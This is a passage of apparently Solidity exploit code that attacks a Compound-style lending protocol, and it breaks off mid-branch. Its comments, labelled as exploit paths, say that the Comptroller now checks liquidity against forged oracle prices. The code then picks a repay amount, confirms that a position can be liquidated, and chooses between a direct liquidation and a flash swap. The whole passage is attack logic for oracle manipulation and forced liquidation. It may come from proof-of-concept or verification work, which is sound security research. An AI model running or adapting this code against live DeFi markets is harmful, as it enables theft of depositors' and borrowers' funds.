            candidate.originalCollateralPrice,
            candidate.debtOracle,
            candidate.cDebt,
            candidate.debtToken,
            candidate.originalDebtPrice
        );

        // exploit_paths[1]: the Comptroller now evaluates liquidity and liquidation checks using forged prices.
        uint256 repayAmount = _chooseRepayAmount(candidate, directBalance);
        require(repayAmount != 0, "no-viable-repay");
        _requireLiquidatable(candidate, repayAmount);

        // exploit_paths[2]: prefer verifier-held debt tokens first; only use a public flash swap when needed.
        if (directBalance >= repayAmount) {
            _directLiquidation(candidate, repayAmount);
        } else {
